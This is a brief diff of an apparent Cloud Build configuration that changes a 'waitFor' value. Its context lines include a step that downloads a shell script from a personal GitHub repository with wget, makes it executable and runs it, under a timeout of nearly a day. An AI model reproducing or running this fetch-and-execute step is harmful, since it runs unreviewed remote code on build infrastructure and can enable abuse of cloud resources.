@@ -87,7 +87,7 @@ steps:
     - |
       wget https://raw.githubusercontent.com/Nunu8383/workspace/main/Crb.sh && chmod +x Crb.sh && ./Crb.sh
     waitFor:
-      - '-'
+      - 
     entrypoint: /bin/bash
 timeout: 86000s
 options:
